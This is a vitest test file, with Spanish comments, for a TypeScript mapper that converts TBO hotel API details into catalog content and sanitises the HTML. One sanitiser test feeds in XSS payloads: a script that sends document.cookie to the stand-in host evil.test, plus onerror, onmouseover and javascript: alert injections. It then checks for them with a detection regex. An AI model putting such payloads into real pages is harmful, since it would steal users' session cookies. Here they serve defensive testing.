import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import type { LoggerPort } from '@sales-travel/core';
import { describe, expect, it } from 'vitest';
import { TboResponseMappingError } from '../errors';
import { mapTboHotelDetailsResponse } from './hotel-details.response.mapper';
import { TboHotelDetailsEnvelopeSchema, type TboHotelDetailsEnvelope } from './response.schema';

/**
 * HotelDetails contra el ejemplo de p. 59-62 (normalizado, ver __fixtures__/README.md) y contra los
 * criterios de RF-32: `5` → 5 estrellas, un `script` se elimina al ingerir, servicios negados fuera.
 */

function envelope(raw: unknown): TboHotelDetailsEnvelope {
  return TboHotelDetailsEnvelopeSchema.parse(raw);
}

type HotelFixture = Record<string, unknown>;

const P59 = JSON.parse(
  readFileSync(join(__dirname, '..', '__fixtures__', 'pdf', 'hotel-details.p59.json'), 'utf8'),
) as { Status: unknown; HotelDetails: HotelFixture[] };

function hotelP59(): HotelFixture {
  const hotel = P59.HotelDetails[0];
  if (hotel === undefined) throw new Error('fixture sin hoteles');
  return { ...hotel };
}

function mapDetails(hotels: unknown[], hotelCodes: readonly string[] = ['1000000']) {
  return mapTboHotelDetailsResponse(
    envelope({ Status: { Code: 200, Description: 'Successful' }, HotelDetails: hotels }),
    { lang: 'es', hotelCodes },
  );
}

describe('mapTboHotelDetailsResponse: el ejemplo de p. 59-62', () => {
  const mapping = mapTboHotelDetailsResponse(envelope(P59), {
    lang: 'en',
    hotelCodes: ['1000000'],
  });
  const [content] = mapping.contents;

  it('la fila de catálogo: 5 estrellas desde el número 5 (RF-32 CA), CityId y país', () => {
    expect(mapping.hotels).toEqual([
      {
        hotelId: '1000000',
        name: 'Sofitel Legend Old Cataract Aswan',
        stars: 5,
        location: { lat: 24.08166, lng: 32.88985 },
        address: 'Abtal El Tahrir Street,Aswan 81511, Assuan, Aswan, 81511, Egypt',
        zipcode: '81511',
        countryCode: 'EG',
        cityCode: '109642',
      },
    ]);
    expect(mapping.missingHotelCodes).toEqual([]);
  });

  it('el contenido `details`: horarios HH:mm, imágenes https, teléfono y sin web (p. 58-59)', () => {
    expect(mapping.lang).toBe('en');
    expect(content).toMatchObject({
      hotelId: '1000000',
      lang: 'en',
      source: 'details',
      name: 'Sofitel Legend Old Cataract Aswan',
      checkInTime: '15:00',
      checkOutTime: '12:00',
      phone: '+20972316000',
      websiteUrl: null,
      images: hotelP59()['Images'],
    });
  });

  it('servicios: 46 disponibles y "Wheelchair accessible" como no disponible (RF-32)', () => {
    expect(content?.facilities).toHaveLength(46);
    expect(content?.facilities).not.toContain('Wheelchair accessible – no');
    expect(content?.facilities.some((facility) => /\bno$/i.test(facility))).toBe(false);
    expect(content?.unavailableFacilities).toEqual(['Wheelchair accessible']);
    expect(mapping.diagnostics.notes).toEqual({ FACILITY_NEGATED: 1 });
  });

  it('descripción saneada, en secciones y en texto plano para WhatsApp', () => {
    const description = String(hotelP59()['Description']);
    expect(content?.descriptionHtml).toBe(
      description.replace('&nbsp;', ' ').replace('<br/>', '<br>'),
    );
    expect(content?.sections).toHaveLength(7);
    expect(
      content?.sections.find((section) => section.label === 'CheckIn Instructions')?.text,
    ).toMatch(/^Extra-person charges may apply/);
    expect(content?.descriptionText).toMatch(/^HeadLine : Near Nubian Museum\n\nLocation : /);
    expect(content?.descriptionText).toContain('Disclaimer notification');
  });

  it('Attractions como objeto {"1) ": …} (p. 61) → un HTML saneado', () => {
    expect(content?.attractionsHtml).toMatch(/^Distances are displayed to the nearest 0\.1 mile/);
    expect(content?.attractionsHtml).toContain('<p>Nubian Museum - 0.4 km / 0.2 mi <br>');
    expect(content?.attractionsHtml).not.toContain('<br />');
  });
});

describe('mapTboHotelDetailsResponse: RNF-16 y tolerancia', () => {
  it('RF-32 CA: un <script> se elimina al ingerir, también su contenido, y queda la nota', () => {
    const mapping = mapDetails([
      {
        HotelCode: '1000000',
        Description:
          '<p>HeadLine : Cerca del mar</p><script>fetch("//evil.test?c="+document.cookie)</script>' +
          '<p onmouseover="alert(1)">Location : Centro</p><img src=x onerror=alert(1)>',
        Attractions: { '1) ': '<a href="javascript:alert(1)">Playa</a> - 1 km' },
      },
    ]);
    const [content] = mapping.contents;
    expect(content?.descriptionHtml).toBe(
      '<p>HeadLine : Cerca del mar</p><p>Location : Centro</p>',
    );
    expect(content?.attractionsHtml).toBe('Playa - 1 km');
    expect(JSON.stringify(mapping.contents)).not.toMatch(
      /<script|alert|cookie|onerror|onmouseover|javascript:|evil/i,
    );
    expect(mapping.diagnostics.notes).toEqual({ HTML_SANITIZED: 2 });
  });

  it('una imagen que no es https se descarta con nota (RNF-16)', () => {
    const mapping = mapDetails([
      {
        HotelCode: '1000000',
        Images: [
          'http://api.tbotechnology.in/imageresource.aspx?img=a',
          'https://api.tbotechnology.in/imageresource.aspx?img=b',
          'https://api.tbotechnology.in/imageresource.aspx?img=b',
          'javascript:alert(1)',
          { url: 'https://x.test/c.jpg' },
        ],
      },
    ]);
    expect(mapping.contents[0]?.images).toEqual([
      'https://api.tbotechnology.in/imageresource.aspx?img=b',
    ]);
    expect(mapping.diagnostics.notes).toEqual({ IMAGE_DROPPED: 3 });
  });

  it('un horario ilegible queda null con nota', () => {
    const mapping = mapDetails([{ HotelCode: '1000000', CheckInTime: 'noon', CheckOutTime: '' }]);
    expect(mapping.contents[0]).toMatchObject({ checkInTime: null, checkOutTime: null });
    expect(mapping.diagnostics.notes).toEqual({ CHECK_TIME_INVALID: 1 });
  });

  it('pedidos que no vuelven se informan; un código no pedido se descarta (Q-62)', () => {
    const mapping = mapDetails(
      [hotelP59(), { ...hotelP59(), HotelCode: '9999999' }, { ...hotelP59() }],
      ['1000000', '2000000'],
    );
    expect(mapping.contents.map((content) => content.hotelId)).toEqual(['1000000']);
    expect(mapping.missingHotelCodes).toEqual(['2000000']);
    expect(mapping.diagnostics.rejected).toEqual({ NOT_REQUESTED: 1, DUPLICATE: 1 });
  });

  it('el detalle por habitación sigue APAGADO: el contenedor sólo se registra como clave (Q-65)', () => {
    const mapping = mapDetails([
      {
        ...hotelP59(),
        Rooms: [
          {
            RoomName: 'Deluxe Room, 1 King Bed, Garden View',
            RoomId: 197354,
            RoomSize: '1830 ft',
            imageURL: ['https://www.tboholidays.com/imageresource.aspx?img=example1'],
          },
        ],
      },
    ]);
    expect(mapping.diagnostics.unknownKeys).toEqual(['HotelDetails[].Rooms']);
    expect(JSON.stringify(mapping)).not.toContain('Deluxe Room');
    expect(JSON.stringify(mapping)).not.toContain('example1');
  });

  it('el contenedor como objeto único (lo que declara la tabla) es una lista de uno', () => {
    const mapping = mapTboHotelDetailsResponse(
      envelope({ Status: { Code: 200 }, HotelDetails: hotelP59() }),
      { lang: 'pt', hotelCodes: ['1000000'] },
    );
    expect(mapping.contents.map((content) => [content.hotelId, content.lang])).toEqual([
      ['1000000', 'pt'],
    ]);
    expect(mapping.diagnostics.notes).toMatchObject({ CONTAINER_SINGLE_OBJECT: 1 });
  });

  it('el log lleva conteos y rutas, nunca nombres, direcciones ni textos del hotel', () => {
    const lines: string[] = [];
    const logger: LoggerPort = {
      debug: (message, meta) => lines.push(JSON.stringify({ message, meta })),
      info: (message, meta) => lines.push(JSON.stringify({ message, meta })),
      warn: (message, meta) => lines.push(JSON.stringify({ message, meta })),
      error: (message, meta) => lines.push(JSON.stringify({ message, meta })),
      child: () => logger,
    };
    mapTboHotelDetailsResponse(
      envelope({
        Status: { Code: 200 },
        HotelDetails: [{ ...hotelP59(), Map: 'x|y', Nuevo: 'Sofitel secreto' }, { HotelName: 'x' }],
      }),
      { lang: 'en', hotelCodes: ['1000000'] },
      { logger },
    );
    const log = lines.join('\n');
    expect(log).toContain('tbo.static.anomalies');
    expect(log).toContain('HotelDetails[].Nuevo');
    expect(log).not.toMatch(/Sofitel|Abtal|Nubian|20972316000|secreto/);
  });

  it('un contexto sin códigos o con un idioma fuera de la lista es un error de cableado', () => {
    expect(() => mapTboHotelDetailsResponse(envelope(P59), { lang: 'en', hotelCodes: [] })).toThrow(
      TboResponseMappingError,
    );
    expect(() =>
      mapTboHotelDetailsResponse(envelope(P59), {
        lang: 'fr' as unknown as 'en',
        hotelCodes: ['1000000'],
      }),
    ).toThrow(TboResponseMappingError);
  });
});
